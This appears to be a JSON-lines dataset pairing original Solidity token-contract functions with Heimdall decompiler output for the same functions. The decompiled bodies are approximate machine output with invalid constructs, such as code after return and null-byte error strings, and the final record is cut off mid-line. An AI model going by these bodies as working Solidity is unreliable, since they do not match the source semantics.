{"contract_address": "0xE717AFf2e3d325cb5E2c7bdB9CB916ff6AF64ec7", "original_solidity_code": "function symbol() public view returns (string memory) {\r\n      return _symbol;\r\n    }", "heimdall_decompiled_code": "function symbol() public view returns (string memory) {\n        if (store_d) {\n            if (store_d - ((store_d / 0x02) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (store_d / 0x02)) / 0x20) * 0x20));\n                uint256 var_d = store_d / 0x02;\n                if (store_d) {\n                    if (store_d - ((store_d / 0x02) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!store_d / 0x02) {\n                            if (0x1f < (store_d / 0x02)) {\n                                var_a = 0x05;\n                                var_e = storage_map_b[var_a];\n                                if ((0x20 + var_c) + (store_d / 0x02) > (0x20 + (0x20 + var_c))) {\n                                    uint256 var_e = (var_c + 0x20) - var_c;\n                                    uint256 var_f = var_c.length;\n                                    uint256 var_g = 0;\n                                    return abi.encodePacked((var_c + 0x20) - var_c, var_c.length);\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x31d3341342D2A7a68EDDF5759C820eFD568D91dA", "original_solidity_code": "function approve(address to, uint256 tokenId) external;\\n\\n    /**\\n     * @dev Returns the account approved for `tokenId` token.\\n     *\\n     * Requirements:\\n     *\\n     * - `tokenId` must exist.\\n     */\\n    function getApproved(uint256 tokenId) external view returns (address operator);\\n\\n    /**\\n     * @dev Approve or remove `operator` as an operator for the caller.\\n     * Operators can call {transferFrom}", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public payable {\n        require(arg0 == (address(arg0)));\n        uint256 var_a = arg1;\n        var_b = 0x02;\n        require(address(storage_map_b[var_a]), \"ERC721: owner query for nonexistent token\");\n        require(!(address(arg0) == (address(storage_map_b[var_a]))), \"ERC721: owner query for nonexistent token\");\n        require(address(storage_map_b[var_a]) == msg.sender, \"ERC721: owner query for nonexistent token\");\n        var_a = address(storage_map_b[var_a]);\n        var_b = 0x05;\n        var_a = address(msg.sender);\n        uint256 var_b = keccak256(var_a);\n        require(bytes1(storage_map_b[var_a]), \"ERC721: owner query for nonexistent token\");\n        var_a = arg1;\n        var_b = 0x04;\n        storage_map_b[var_a] = (address(arg0)) | (uint96(storage_map_b[var_a]));\n        var_a = arg1;\n        var_b = 0x02;\n        require(address(storage_map_b[var_a]), \"ERC721: owner query for nonexistent token\");\n        emit Approval(address(storage_map_b[var_a]), address(arg0), arg1);\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x29;\n        var_f = 0x4552433732313a206f776e657220717565727920666f72206e6f6e6578697374;\n        var_g = 0x656e7420746f6b656e0000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x38;\n        var_f = 0x4552433732313a20617070726f76652063616c6c6572206973206e6f74206f77;\n        var_g = 0x6e6572206e6f7220617070726f76656420666f7220616c6c0000000000000000;\n        require(address(storage_map_b[var_a]) == msg.sender, \"ERC721: approve caller is not owner nor approved for all\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x38;\n        var_f = 0x4552433732313a20617070726f76652063616c6c6572206973206e6f74206f77;\n        var_g = 0x6e6572206e6f7220617070726f76656420666f7220616c6c0000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x21;\n        var_f = 0x4552433732313a20617070726f76616c20746f2063757272656e74206f776e65;\n        var_g = 0x7200000000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x29;\n        var_f = 0x4552433732313a206f776e657220717565727920666f72206e6f6e6578697374;\n        var_g = 0x656e7420746f6b656e0000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x2712ac3E4Fb06A0d1FB54E31eB81e7db4731c417", "original_solidity_code": "function manualSwap() external {\r\n        require(_msgSender() == shiaburnWallet);\r\n        uint256 contractBalance = balanceOf(address(this));\r\n        if (contractBalance > 0) {\r\n            swapTokensForEth(contractBalance);\r\n        }\r\n    }", "heimdall_decompiled_code": "function manualSwap() public {\n        require(address(msg.sender) == (address(store_g)));\n        address var_a = address(this);\n        var_b = 0x02;\n        require(!storage_map_l[var_a]);\n        burnMode = 0x010000000000000000000000000000000000000000 | (uint248(burnMode));\n        var_c = 0x02;\n        uint256 var_d = var_d + 0x60;\n        var_e = msg.data[4:68];\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x32;\n        address var_g = address(this);\n        var_h = 0xad5c464800000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(uniswapV2Router).WETH(var_i); // staticcall\n        var_d = var_d + (uint248(ret0.length + 0x1f));\n        require(!((var_d + ret0.length) - var_d) < 0x20);\n        require(var_d.length == (address(var_d.length)));\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x32;\n        uint256 var_j = address(var_d.length);\n        require(address(this));\n        require(address(uniswapV2Router));\n        var_a = address(this);\n        var_b = 0x03;\n        var_a = address(uniswapV2Router);\n        address var_b = keccak256(var_a);\n        storage_map_l[var_a] = storage_map_l[var_a];\n        address var_k = storage_map_l[var_a];\n        emit Approval(address(this), address(uniswapV2Router), storage_map_l[var_a]);\n        var_k = 0x791ac94700000000000000000000000000000000000000000000000000000000;\n        address var_l = storage_map_l[var_a];\n        uint256 var_m = 0;\n        var_n = 0xa0;\n        uint256 var_o = var_d.length;\n        address var_p = address(this);\n        uint256 var_q = block.timestamp;\n        require(address(uniswapV2Router).code.length);\n        (bool success, bytes memory ret0) = address(uniswapV2Router).{ value: var_m ether }Unresolved_791ac947(var_l); // call\n        burnMode = uint248(burnMode);\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_l = 0x20;\n        var_m = 0x22;\n        var_n = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_p = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_l = 0x20;\n        var_m = 0x24;\n        var_n = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_p = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x210a768a5146f4d3C1068bB37dD780304c6D648D", "original_solidity_code": "function renounceOwnership() public virtual onlyOwner {\n        emit OwnershipTransferred(_owner, address(0));\n        _owner = address(0);\n    }", "heimdall_decompiled_code": "function renounceOwnership() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        emit OwnershipTransferred(address(owner), 0);\n        owner = uint96(owner);\n    }"}
{"contract_address": "0x2FB4983c5Ed3d39d636aE4fb6D12309689853cbA", "original_solidity_code": "function openTrading() external onlyOwner() {\r\n        require(!tradingOpen,\"Trading is already open\");\r\n        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n        _approve(address(this), address(uniswapV2Router), _tTotal);\r\n        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());\r\n        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);\r\n        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);\r\n        swapEnabled = true;\r\n        tradingOpen = true;\r\n    }", "heimdall_decompiled_code": "function openTrading() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(!(bytes1(store_g / 0x010000000000000000000000000000000000000000)), \"Trading is already open\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x17;\n        var_d = 0x54726164696e6720697320616c7265616479206f70656e000000000000000000;\n        store_f = 0x7a250d5630b4cf539739df2c5dacb4c659f2488d | (uint96(store_f));\n        require(0x09, \"ERC20: approve to the zero address\");\n        require((0x01 == 0x01) | !0x3b9aca00, \"ERC20: approve to the zero address\");\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x11;\n        require(address(this), \"ERC20: approve to the zero address\");\n        require(0x7a250d5630b4cf539739df2c5dacb4c659f2488d, \"ERC20: approve to the zero address\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x22;\n        var_d = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_g = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        address var_e = address(this);\n        var_h = 0x02;\n        var_e = 0x7a250d5630b4cf539739df2c5dacb4c659f2488d;\n        address var_h = keccak256(var_e);\n        storage_map_n[var_e] = 0x3b9aca00;\n        var_a = 0x3b9aca00;\n        emit Approval(address(this), 0x7a250d5630b4cf539739df2c5dacb4c659f2488d, 0x3b9aca00);\n        var_a = 0xc45a015500000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_f / 0x01).factory(var_b); // staticcall\n        uint256 var_i = var_i + (uint248(ret0.length + 0x1f));\n        require(!((var_i + ret0.length) - var_i) < 0x20);\n        require(var_i.length == (address(var_i.length)));\n        var_j = 0xad5c464800000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_f / 0x01).WETH(var_c); // staticcall\n        var_i = var_i + (uint248(ret0.length + 0x1f));\n        require(!((var_i + ret0.length) - var_i) < 0x20);\n        require(var_i.length == (address(var_i.length)));\n        var_k = 0xc9c6539600000000000000000000000000000000000000000000000000000000;\n        address var_d = address(this);\n        uint256 var_g = address(var_i.length);\n        (bool success, bytes memory ret0) = address(var_i.length).Unresolved_c9c65396(var_d); // call\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x24;\n        var_d = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_g = 0x7265737300000000000000000000000000000000000000000000000000000000;\n        if (0x0a) {\n            if (0x0a == 0x01) {\n                if (0x0a == 0x02) {\n                    if (!0x09 > 0xff) {\n                        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_f = 0x11;\n                        if (!((0x0a < 0x0b) & (0x09 < 0x4e)) | ((0x0a < 0x0133) & (0x09 < 0x20))) {\n                            if (!0x09 > 0x01) {\n                                if (!0x01 > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                    var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                    var_f = 0x11;\n                                    if (!0x0a > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                        var_f = 0x11;\n                                        if (!0x01) {\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0xB108eB679AAD7822009ad3A318Cc7daC6198f03b", "original_solidity_code": "function name() public view virtual override returns (string memory) {\\r\\n        return _name;\\r\\n    }", "heimdall_decompiled_code": "function name() public view returns (string memory) {\n        if (store_a) {\n            if (store_a - ((store_a / 0x02) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (store_a / 0x02)) / 0x20) * 0x20));\n                uint256 var_d = store_a / 0x02;\n                if (store_a) {\n                    if (store_a - ((store_a / 0x02) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!store_a / 0x02) {\n                            if (0x1f < (store_a / 0x02)) {\n                                var_a = 0x68;\n                                var_e = storage_map_b[var_a];\n                                if ((0x20 + var_c) + (store_a / 0x02) > (0x20 + (0x20 + var_c))) {\n                                    uint256 var_e = (var_c + 0x20) - var_c;\n                                    uint256 var_f = var_c.length;\n                                    uint256 var_g = 0;\n                                    return abi.encodePacked((var_c + 0x20) - var_c, var_c.length);\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x3628F9C6c8AAC0c4A085859F247D1828F534D309", "original_solidity_code": "function balanceOf(address account) public view override returns (uint256) {\r\n        return tokenFromReflection(_rOwned[account]);\r\n    }", "heimdall_decompiled_code": "function balanceOf(address arg0) public view {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x02;\n        require(!(storage_map_m[var_a] > store_f), \"Amount must be less than total reflections\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x2a;\n        var_f = 0x416d6f756e74206d757374206265206c657373207468616e20746f74616c2072;\n        var_g = 0x65666c656374696f6e7300000000000000000000000000000000000000000000;\n        uint256 var_h = 0x40 + var_h;\n        var_c = 0x1a;\n        var_i = 0x536166654d6174683a206469766973696f6e206279207a65726f000000000000;\n        require(0x016345785d8a0000, \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_j = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_f = 0x20;\n        uint256 var_g = var_h.length;\n        require(!(0 > var_h.length), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        uint256 var_k = 0;\n        var_l = var_m;\n        require(!(0x20 > var_h.length), \"SafeMath: division by zero\");\n        var_k = 0;\n        if (0x016345785d8a0000) {\n            var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n            var_n = 0x12;\n            require(0x016345785d8a0000);\n        }\n    }"}
{"contract_address": "0x3D93F860f4f6f4C54B79eDa0c09A1E70cc79947b", "original_solidity_code": "function openTrading() external onlyOwner() {\\n        require(!tradingOpen,\\\"trading is already open\\\");\\n        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\\n        _approve(address(this), address(uniswapV2Router), _tTotal);\\n        IUniswapV2Factory factory=IUniswapV2Factory(uniswapV2Router.factory());\\n        uniswapV2Pair = factory.getPair(address(this),uniswapV2Router.WETH());\\n        if(uniswapV2Pair==address(0x0)){\\n          uniswapV2Pair = factory.createPair(address(this), uniswapV2Router.WETH());\\n        }\\n        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);\\n        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);\\n        swapEnabled = true;\\n        tradingOpen = true;\\n    }", "heimdall_decompiled_code": "function openTrading() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(!(bytes1(store_c / 0x010000000000000000000000000000000000000000)), \"trading is already open\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x17;\n        var_d = 0x74726164696e6720697320616c7265616479206f70656e000000000000000000;\n        store_e = 0x7a250d5630b4cf539739df2c5dacb4c659f2488d | (uint96(store_e));\n        require(0x08, \"ERC20: approve to the zero address\");\n        require((0x01 == 0x01) | !0x0bebc200, \"ERC20: approve to the zero address\");\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x11;\n        require(address(this), \"ERC20: approve to the zero address\");\n        require(0x7a250d5630b4cf539739df2c5dacb4c659f2488d, \"ERC20: approve to the zero address\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x22;\n        var_d = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_g = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        address var_e = address(this);\n        var_h = 0x02;\n        var_e = 0x7a250d5630b4cf539739df2c5dacb4c659f2488d;\n        address var_h = keccak256(var_e);\n        storage_map_l[var_e] = 0x0bebc200;\n        var_a = 0x0bebc200;\n        emit Approval(address(this), 0x7a250d5630b4cf539739df2c5dacb4c659f2488d, 0x0bebc200);\n        var_a = 0xc45a015500000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_e).factory(var_b); // staticcall\n        uint256 var_i = var_i + (uint248(ret0.length + 0x1f));\n        require(!((var_i + ret0.length) - var_i) < 0x20);\n        require(var_i.length == (address(var_i.length)));\n        var_j = 0xad5c464800000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_e / 0x01).WETH(var_c); // staticcall\n        var_i = var_i + (uint248(ret0.length + 0x1f));\n        require(!((var_i + ret0.length) - var_i) < 0x20);\n        require(var_i.length == (address(var_i.length)));\n        var_k = 0xe6a4390500000000000000000000000000000000000000000000000000000000;\n        address var_d = address(this);\n        uint256 var_g = address(var_i.length);\n        (bool success, bytes memory ret0) = address(var_i.length).Unresolved_e6a43905(var_d); // staticcall\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x24;\n        var_d = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_g = 0x7265737300000000000000000000000000000000000000000000000000000000;\n        if (0x0a) {\n            if (0x0a == 0x01) {\n                if (0x0a == 0x02) {\n                    if (!0x08 > 0xff) {\n                        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_f = 0x11;\n                        if (!((0x0a < 0x0b) & (0x08 < 0x4e)) | ((0x0a < 0x0133) & (0x08 < 0x20))) {\n                            if (!0x08 > 0x01) {\n                                if (!0x01 > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                    var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                    var_f = 0x11;\n                                    if (!0x0a > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                        var_f = 0x11;\n                                        if (!0) {\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0xB1C76Fbd9520964Be300A66679C3ac7dae32f744", "original_solidity_code": "function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\r\n        _transferOwnership(newOwner);\r\n    }", "heimdall_decompiled_code": "function transferOwnership(address arg0) public {\n        require(arg0 == (address(arg0)));\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(address(arg0), \"Ownable: new owner is the zero address\");\n        owner = (address(arg0)) | (uint96(owner));\n        emit OwnershipTransferred(address(owner), address(arg0));\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x26;\n        var_d = 0x4f776e61626c653a206e6577206f776e657220697320746865207a65726f2061;\n        var_e = 0x6464726573730000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xF36754d67a8C99e1D683915ED5A6E55aB259ba79", "original_solidity_code": "function set_New_Router_Address(address newRouter) public onlyOwner() {\r\n        IUniswapV2Router02 _newPCSRouter = IUniswapV2Router02(newRouter);\r\n        uniswapV2Router = _newPCSRouter;\r\n    }", "heimdall_decompiled_code": "function set_New_Router_Address(address arg0) public {\n        require(arg0 == (address(arg0)));\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        uniswapV2Router = (address(arg0) * 0x01) | (uint96(uniswapV2Router));\n    }"}
{"contract_address": "0x46c4C3ef9A1557017955E74D4F3550971C2700A3", "original_solidity_code": "function transfer() external { \r\n             payable(autoLiquidityReceiver).transfer(address(this).balance);\r\n            \r\n    }", "heimdall_decompiled_code": "function transfer() public {\n        (bool success, bytes memory ret0) = address(store_n).transfer(address(this).balance);\n    }"}
{"contract_address": "0x39f3C6C2a3E69D908DFE9863C9127080CC487933", "original_solidity_code": "function name() public view virtual override returns (string memory) {\r\n        return _name;\r\n    }", "heimdall_decompiled_code": "function name() public view returns (string memory) {\n        if (store_a) {\n            if (store_a - ((store_a >> 0x01) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (store_a >> 0x01)) / 0x20) * 0x20));\n                bytes32 var_d = store_a >> 0x01;\n                if (store_a) {\n                    if (store_a - ((store_a >> 0x01) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!store_a >> 0x01) {\n                            if (0x1f < (store_a >> 0x01)) {\n                                var_a = 0x03;\n                                var_e = storage_map_b[var_a];\n                                if ((0x20 + var_c) + (store_a >> 0x01) > (0x20 + (0x20 + var_c))) {\n                                    var_e = 0x20;\n                                    uint256 var_f = var_c.length;\n                                    uint256 var_g = 0;\n                                    return abi.encodePacked(0x20, var_c.length);\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0xeD90409D82B973b1D539F8f5D3e041c387916BbA", "original_solidity_code": "function approve(address spender, uint256 amount) public override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(arg1 == arg1);\n        require(address(msg.sender) - 0, \"ERC20: approve to the zero address\");\n        require(address(arg0) - 0, \"ERC20: approve to the zero address\");\n        address var_a = address(msg.sender);\n        var_b = 0x02;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_b[var_a] = arg1;\n        uint256 var_c = arg1;\n        emit Approval(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x22;\n        var_g = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_h = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x24;\n        var_g = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_h = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x311f785e0fcb5A7c8990cdBe114e59A787116705", "original_solidity_code": "function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\r\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function increaseAllowance(address arg0, uint256 arg1) public returns (bool) {\n        require(arg0 == (address(arg0)));\n        address var_a = msg.sender;\n        var_b = 0x01;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        require(!(storage_map_b[var_a] > (arg1 + storage_map_b[var_a])), \"ERC20: approve to the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(address(msg.sender), \"ERC20: approve to the zero address\");\n        require(address(arg0), \"ERC20: approve to the zero address\");\n        var_a = address(msg.sender);\n        var_b = 0x01;\n        var_a = address(arg0);\n        var_b = keccak256(var_a);\n        storage_map_b[var_a] = arg1 + storage_map_b[var_a];\n        uint256 var_d = arg1 + storage_map_b[var_a];\n        emit Approval(address(msg.sender), address(arg0), arg1 + storage_map_b[var_a]);\n        var_d = 0x01;\n        return 0x01;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x22;\n        var_g = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_h = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x24;\n        var_g = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_h = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x780c7f2FdF0D47F25f5858975DBd0159DB50C1B2", "original_solidity_code": "function isExcludedFromFees(address account) public view returns (bool) {\\r\\n        return _isExcludedFromFees[account];\\r\\n    }", "heimdall_decompiled_code": "function isExcludedFromFees(address arg0) public view returns (bool) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x19;\n        address var_c = !(!bytes1(storage_map_b[var_a] / 0x01));\n        return !(!bytes1(storage_map_b[var_a] / 0x01));\n    }"}
{"contract_address": "0xB997F52A0cF32b5120eD31BEAbaeF3Af6256cb77", "original_solidity_code": "function _setAddr(address _libee_addr) public onlyOwner  {  \\n            libee_addr = _libee_addr;\\n        }", "heimdall_decompiled_code": "function _setAddr(address arg0) public {\n        require(arg0 == (address(arg0)));\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        store_b = (address(arg0) * 0x01) | (uint96(store_b));\n    }"}
{"contract_address": "0x5ED7ad95beA8f3c7aB1bDeCCb843EbDE3B902BB2", "original_solidity_code": "function transfer(address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function transfer(address arg0, uint256 arg1) public {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender));\n        require(address(arg0));\n        require(arg1 > 0);\n        require(address(owner) == (address(msg.sender)));\n        require(address(owner) == (address(arg0)));\n        address var_a = address(msg.sender);\n        var_b = 0x04;\n        require(bytes1(storage_map_b[var_a]));\n        require(!bytes1(storage_map_b[var_a]));\n        require(store_c > store_d, \"SafeMath: multiplication overflow\");\n        require(0 - arg1, \"SafeMath: multiplication overflow\");\n        require((store_e == ((store_e * arg1) / arg1)) | !arg1, \"SafeMath: multiplication overflow\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(arg1, \"SafeMath: multiplication overflow\");\n        require(((store_e * arg1) / arg1) == store_e, \"SafeMath: multiplication overflow\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x21;\n        var_g = 0x536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f;\n        var_h = 0x7700000000000000000000000000000000000000000000000000000000000000;\n        uint256 var_i = 0x40 + var_i;\n        var_d = 0x1a;\n        var_j = 0x536166654d6174683a206469766973696f6e206279207a65726f000000000000;\n        require(0x64, \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_g = 0x20;\n        uint256 var_h = var_i.length;\n        uint256 var_l = 0;\n        var_m = var_n;\n        var_l = 0;\n        require(0x64, \"SafeMath: addition overflow\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x12;\n        require(!(address(store_f) == (address(msg.sender))), \"SafeMath: addition overflow\");\n        require(!(address(store_f) == (address(msg.sender))), \"SafeMath: addition overflow\");\n        require(!(address(store_f) == (address(msg.sender))), \"SafeMath: addition overflow\");\n        require(address(store_f) == (address(arg0)), \"SafeMath: addition overflow\");\n        var_a = address(arg0);\n        var_b = 0x03;\n        require(!(!bytes1(storage_map_b[var_a])), \"SafeMath: addition overflow\");\n        require(!(address(store_f) == (address(arg0))), \"SafeMath: addition overflow\");\n        require(!(address(store_f) == (address(arg0))), \"SafeMath: addition overflow\");\n        var_a = address(this);\n        var_b = 0x01;\n        require(!(!bytes1(store_f / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_f / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_f / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_f / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_f / 